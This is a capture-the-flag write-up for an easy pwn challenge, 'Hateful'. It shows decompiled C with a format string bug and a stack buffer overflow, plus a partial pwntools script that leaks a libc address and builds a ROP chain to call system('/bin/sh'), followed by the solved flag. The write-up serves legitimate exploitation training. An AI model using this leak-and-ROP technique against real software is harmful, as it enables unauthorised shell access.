# Hateful

Category: pwn \
Difficulty: Easy

> You hate your Boss??? \
You wanna just trash talk him but you are afraid he would fire you??? \
Dont worry we got you! send us the message you want to send him and we will take care of everything for you!

`nc 52.59.124.14:5020`

Attachments: `hateful` (binary), `libc.so.6` (libc), `ld-linux-x86-64.so2`

## Setup

Patch the binary with the provided libc file. I used a tool called `pwninit`.

There are two vuln in `send_message()`:

```c
void send_message(void)

{
  char email_buf [112];
  char buf [1008];
  
  puts("please provide your bosses email!");
  printf(">> ");
  __isoc99_scanf("%99s%*c",email_buf);
  printf("email provided: ");
  printf(email_buf);
  putchar(10);
  puts("now please provide the message!");
  fgets(buf,0x1000,stdin);
  puts("Got it! we will send the message for him later!");
  return;
}
```

1. Format string

```c
printf(email_buf);  // can use %s to print stuff on stack
```

We can use this to leak addresses off the stack, and I used this to leak a libc address to call `system`

2. Buffer overflow

```c
char buf [1008];
// some code in the middle...
fgets(buf,0x1000,stdin);
```

Good ol' buffer overflow (with no canary!). We can use ROP to pop `/bin/sh` address into rdi and call `system()` to get a shell, and read the flag.

## Script (partial)

```py
def do_pwn(io: process | remote) -> None:
    sla = io.sendlineafter
    sa = io.sendafter
    sl = io.sendline
    sd = io.send
    rl = io.recvline
    ru = io.recvuntil
    rc = io.recv
    elf = ELF(bin_path)
    libc = elf.libc
    rop = ROP([elf, libc])
    def exploit() -> None:
        info(f"got puts {hex(elf.got['puts'])} got plt {hex(elf.plt['puts'])}")
        sla(b">> ", "yay")
        sla(b">> ", flat(
            b"AAAAAAAAAAAA%8$s",
            p64(elf.got['printf']),
            b"AAAAAAAAAAAAAAAA%5$p%6$p%7$p%8$p",
        ))
        # pause()
        addr = u64(ru(b"\x7f")[-6:].ljust(8, b"\x00"))
        success(f"Leaked address: {hex(addr)}")
        libc.address = addr - libc.sym['printf']
        sla(b"message!", flat(
            b"A" * 1016,
            p64(rop.ret.address + libc.address),
            p64(rop.rdi.address + libc.address),
            p64(libc.search(b"/bin/sh\0").__next__()),
            p64(libc.sym["system"]),
        ))
        return
    exploit()
```

## Flag

`ENO{W3_4R3_50RRY_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}`
